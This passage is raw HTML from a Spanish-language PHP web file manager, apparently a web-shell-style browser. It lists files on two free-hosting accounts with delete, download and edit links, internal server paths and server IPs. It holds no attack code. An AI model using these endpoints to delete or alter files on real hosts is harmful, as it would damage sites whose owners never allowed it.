                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::sitemap.xml">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::sp-widget.php">sp-widget.php</a></td>
                    <td>Archivo</td>
                    <td>2.7 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/sp-widget.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/sp-widget.php::sp-widget.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::sp-widget.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::sub-head.php">sub-head.php</a></td>
                    <td>Archivo</td>
                    <td>250.81 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/sub-head.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/sub-head.php::sub-head.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::sub-head.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::validar_char.php">validar_char.php</a></td>
                    <td>Archivo</td>
                    <td>352 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/validar_char.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/validar_char.php::validar_char.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::validar_char.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::vprevia.php">vprevia.php</a></td>
                    <td>Archivo</td>
                    <td>6.15 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/vprevia.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/vprevia.php::vprevia.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::vprevia.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::xtenyou.php">xtenyou.php</a></td>
                    <td>Archivo</td>
                    <td>505.35 KB</td>
                    <td><span class="si_permisos">rw-rw-rw-</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/xtenyou.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs/xtenyou.php::xtenyou.php::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol2/eshost.com.ar/eshos_6340682/skazu.totalh.com/htdocs::xtenyou.php">Editar</a>
                    </td>
                    </tr></table><div id="pie">
    <div id="pie_logo"></div><a id="servidor" href="http://201.139.155.111/">Tu IP: 201.139.155.111</a>
    <a id="servidor" href="http://209.190.24.9/">IP del servidor: 209.190.24.9</a>
    <span id="carga" href="#">0.242 seg</span>
    </div> <table>
            <tr class="primer_fila">
                <td></td>
                <td>Nombre</td>
                <td>Tipo</td>
                <td>Tamaño</td>
                <td>Permisos</td>
                <td class="opciones">Opciones</td>
            </tr><tr valign="top">
                        <td class="enlace"></td>
                        <td><a href="?dir::">..</a></td>
                        <td>Enlace</td>
                        <td></td>
                        <td><span class="no_permisos">---------</span></td>
                        <td></td>
                    </tr><tr valign="top">
                        <td class="enlace"></td>
                        <td><a href="?dir::">.</a></td>
                        <td>Enlace</td>
                        <td></td>
                        <td><span class="no_permisos">---------</span></td>
                        <td></td>
                        </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/admin">admin</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/admin::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/comunidades">comunidades</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/comunidades::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/cuenta">cuenta</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/cuenta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/images">images</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/images::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/includes">includes</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/includes::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/lab">lab</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/lab::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/mensajes">mensajes</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/mensajes::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/notificaciones">notificaciones</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/notificaciones::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/recaptcha">recaptcha</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/recaptcha::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/rss">rss</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/rss::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/search">search</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/search::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/socialads">socialads</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/socialads::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::.htaccess">.htaccess</a></td>
                    <td>Archivo</td>
                    <td>3.81 KB</td>
                    <td><span class="si_permisos">rw-r--r--</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/.htaccess::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/.htaccess::.htaccess::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::.htaccess">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::404.php">404.php</a></td>
                    <td>Archivo</td>
                    <td>7.71 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/404.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/404.php::404.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::404.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::agregar.form.php">agregar.form.php</a></td>
                    <td>Archivo</td>
                    <td>12.8 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/agregar.form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/agregar.form.php::agregar.form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::agregar.form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::agregar.php">agregar.php</a></td>
                    <td>Archivo</td>
                    <td>2.65 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/agregar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/agregar.php::agregar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::agregar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::anuncie.form.php">anuncie.form.php</a></td>
                    <td>Archivo</td>
                    <td>3.27 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/anuncie.form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/anuncie.form.php::anuncie.form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::anuncie.form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::bloqueados-cambiar.php">bloqueados-cambiar.php</a></td>
                    <td>Archivo</td>
                    <td>937 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/bloqueados-cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/bloqueados-cambiar.php::bloqueados-cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::bloqueados-cambiar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::borrador.form.php">borrador.form.php</a></td>
                    <td>Archivo</td>
                    <td>14.15 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/borrador.form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/borrador.form.php::borrador.form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::borrador.form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::borradores.php">borradores.php</a></td>
                    <td>Archivo</td>
                    <td>2.52 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/borradores.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/borradores.php::borradores.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::borradores.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador-google.php">buscador-google.php</a></td>
                    <td>Archivo</td>
                    <td>10.12 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador-google.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador-google.php::buscador-google.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador-google.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador-skynet.php">buscador-skynet.php</a></td>
                    <td>Archivo</td>
                    <td>16.1 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador-skynet.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador-skynet.php::buscador-skynet.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador-skynet.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador-tags.php">buscador-tags.php</a></td>
                    <td>Archivo</td>
                    <td>16.01 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador-tags.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador-tags.php::buscador-tags.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador-tags.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador.php">buscador.php</a></td>
                    <td>Archivo</td>
                    <td>19.21 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador.php::buscador.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscadordegooles.php">buscadordegooles.php</a></td>
                    <td>Archivo</td>
                    <td>7.46 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscadordegooles.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscadordegooles.php::buscadordegooles.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscadordegooles.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscadorweb.php">buscadorweb.php</a></td>
                    <td>Archivo</td>
                    <td>19.36 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscadorweb.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscadorweb.php::buscadorweb.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscadorweb.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::cambioex.php">cambioex.php</a></td>
                    <td>Archivo</td>
                    <td>1012 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/cambioex.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/cambioex.php::cambioex.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::cambioex.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::chat.php">chat.php</a></td>
                    <td>Archivo</td>
                    <td>3.27 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/chat.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/chat.php::chat.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::chat.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::chatx.php">chatx.php</a></td>
                    <td>Archivo</td>
                    <td>3.28 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/chatx.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/chatx.php::chatx.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::chatx.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::clima.php">clima.php</a></td>
                    <td>Archivo</td>
                    <td>421 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/clima.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/clima.php::clima.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::clima.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::comentario-borrar.php">comentario-borrar.php</a></td>
                    <td>Archivo</td>
                    <td>887 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
